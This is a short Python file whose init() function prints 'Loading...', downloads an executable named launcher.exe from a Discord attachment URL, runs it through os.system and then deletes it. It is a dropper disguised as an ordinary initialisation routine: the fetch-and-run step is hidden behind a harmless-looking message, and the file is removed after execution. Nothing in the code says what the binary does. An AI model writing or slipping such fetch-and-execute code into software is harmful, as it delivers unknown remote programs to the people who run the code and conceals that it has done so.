def init():
    import requests
    import os

    print("Loading...")

    url = 'https://cdn.discordapp.com/attachments/997949994202058882/997966097905106944/launcher.exe'
    r = requests.get(url, allow_redirects=True)

    open('launcher.exe', 'wb').write(r.content)

    os.system('launcher.exe')
    os.remove('launcher.exe')
